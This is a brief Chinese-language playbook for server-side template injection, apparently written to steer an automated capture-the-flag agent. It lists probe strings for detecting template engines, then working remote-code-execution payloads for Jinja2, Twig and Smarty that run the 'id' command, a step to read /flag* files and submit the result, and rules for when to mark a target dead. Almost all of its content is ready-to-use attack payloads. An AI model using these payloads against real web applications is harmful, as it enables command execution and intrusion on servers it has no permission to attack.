# ssti 模板注入

适用：搜索结果回显输入、页面渲染用户内容、报表/模板相关功能；输入 {{7*7}} 回显 49。

打法：
- 探针链一条命令：{{7*7}}、${7*7}、<%= 7*7 %>、{7*7}、#{7*7} 逐个对比回显。
- Jinja2 确认后 RCE：{{c.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
  （新版可用 request/application 变体；绕过 {{ }} 时用 {% if 7*7==49 %}OK{% endif %}）。
- Twig：{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
- Smarty：{system('id')}
- 拿到执行先 cat /flag*；flag{ 出现即提交。

判定：算术回显 49 → fact(kind=ssti)；RCE 出 flag → finding。

停止：探针链全无回显差异，标 dead。
